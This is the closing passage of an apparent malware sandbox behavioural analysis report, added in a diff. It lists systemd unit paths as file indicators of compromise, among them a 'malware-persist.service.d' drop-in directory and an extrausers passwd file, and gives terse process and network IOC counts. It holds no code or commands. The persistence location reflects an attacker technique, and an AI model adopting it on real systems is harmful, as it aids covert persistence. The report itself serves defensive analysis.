+  • /usr/lib/systemd/system/systemd-pcrlock-secureboot-policy.service
+  • /usr/lib/systemd/system/systemd-pcrmachine.service
+  • /usr/lib/systemd/system/systemd-pcrphase-initrd.service
+  • /usr/lib/systemd/system/systemd-pcrphase-sysinit.service
+  • /usr/lib/systemd/system/systemd-pcrphase.service
+  • /usr/lib/systemd/system/systemd-poweroff.service
+  • /usr/lib/systemd/system/systemd-pstore.service
+  • /usr/lib/systemd/system/systemd-quotacheck.service
+  • /usr/lib/systemd/system/systemd-random-seed.service
+  • /usr/lib/systemd/system/systemd-reboot.service
+  • /usr/lib/systemd/system/systemd-remount-fs.service
+  • /usr/lib/systemd/system/systemd-repart.service
+  • /usr/lib/systemd/system/systemd-rfkill.service
+  • /usr/lib/systemd/system/systemd-soft-reboot.service
+  • /usr/lib/systemd/system/systemd-storagetm.service
+  • /usr/lib/systemd/system/systemd-suspend-then-hibernate.service
+  • /usr/lib/systemd/system/systemd-suspend.service
+  • /usr/lib/systemd/system/systemd-sysctl.service
+  • /usr/lib/systemd/system/systemd-sysext.service
+  • /usr/lib/systemd/system/systemd-sysext@.service
+  • /usr/lib/systemd/system/systemd-sysupdate-reboot.service
+  • /usr/lib/systemd/system/systemd-sysupdate.service
+  • /usr/lib/systemd/system/systemd-sysusers.service
+  • /usr/lib/systemd/system/systemd-time-wait-sync.service
+  • /usr/lib/systemd/system/systemd-timedated.service
+  • /usr/lib/systemd/system/systemd-tmpfiles-clean.service
+  • /usr/lib/systemd/system/systemd-tmpfiles-setup-dev-early.service
+  • /usr/lib/systemd/system/systemd-tmpfiles-setup-dev.service
+  • /usr/lib/systemd/system/systemd-tmpfiles-setup.service
+  • /usr/lib/systemd/system/systemd-tpm2-setup-early.service
+  • /usr/lib/systemd/system/systemd-tpm2-setup.service
+  • /usr/lib/systemd/system/systemd-update-done.service
+  • /usr/lib/systemd/system/systemd-update-utmp-runlevel.service
+  • /usr/lib/systemd/system/systemd-update-utmp.service
+  • /usr/lib/systemd/system/systemd-user-sessions.service
+  • /usr/lib/systemd/system/systemd-volatile-root.service
+  • /usr/lib/systemd/system/user-runtime-dir@.service
+  • /usr/lib/systemd/system/user@.service
+  • /usr/lib/systemd/system/x11-common.service
+  • /usr/local/lib/systemd/system/malware-persist.service.d
+  • /var/lib/extrausers/passwd
+
+### Process IOCs:
+  • Suspicious process names detected in calls
+
+### Network IOCs:
+  • 93 network-related activities detected
+
+====================================================================================================
+END OF BEHAVIORAL ANALYSIS REPORT
+====================================================================================================
